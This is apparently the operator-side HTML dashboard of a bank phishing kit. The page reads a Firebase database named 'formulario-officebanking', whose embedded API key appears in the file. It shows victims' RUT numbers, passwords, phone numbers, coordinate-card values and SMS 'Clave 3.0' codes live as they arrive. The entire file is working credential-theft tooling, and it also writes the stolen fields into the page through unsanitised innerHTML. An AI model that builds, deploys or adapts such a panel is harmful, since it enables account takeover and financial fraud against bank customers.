
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Panel en Vivo - Estilo Excel</title>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
  <style>
    body {
      font-family: sans-serif;
      padding: 20px;
      background: #f9f9f9;
    }
    h2 {
      color: #444;
    }
    table {
      border-collapse: collapse;
      width: 100%;
      background: white;
      box-shadow: 0 0 5px rgba(0,0,0,0.1);
    }
    th, td {
      border: 1px solid #ccc;
      padding: 8px 10px;
      text-align: left;
      font-size: 14px;
    }
    th {
      background-color: #d32f2f;
      color: white;
    }
    tr:nth-child(even) {
      background-color: #f2f2f2;
    }
    .small {
      font-size: 12px;
      color: #888;
    }
  </style>
</head>
<body>
  <h2>Registros en Vivo</h2>
  <table id="tabla">
    <thead>
      <tr>
        <th>Fecha y Hora</th>
        <th>RUT</th>
        <th>Contraseña</th>
        <th>Teléfono</th>
        <th>Coordenadas</th>
        <th>Clave 3.0</th>
      </tr>
    </thead>
    <tbody></tbody>
  </table>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
      authDomain: "formulario-officebanking.firebaseapp.com",
      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
      projectId: "formulario-officebanking",
      storageBucket: "formulario-officebanking.appspot.com",
      messagingSenderId: "604053438195",
      appId: "1:604053438195:web:188de91bee9a62f0d3c186"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const ref = db.ref("registros");

    ref.on("child_added", snapshot => {
      const data = snapshot.val();
      const row = document.createElement("tr");
      row.innerHTML = `
        <td>${data.fecha || ""}</td>
        <td>${data.rut || ""}</td>
        <td>${data.clave || ""}</td>
        <td>${data.telefono || ""}</td>
        <td>${data.coordenadas || ""}</td>
        <td>${data.clave_sms || ""}</td>
      `;
      document.querySelector("#tabla tbody").prepend(row);
    });
  </script>
</body>
</html>
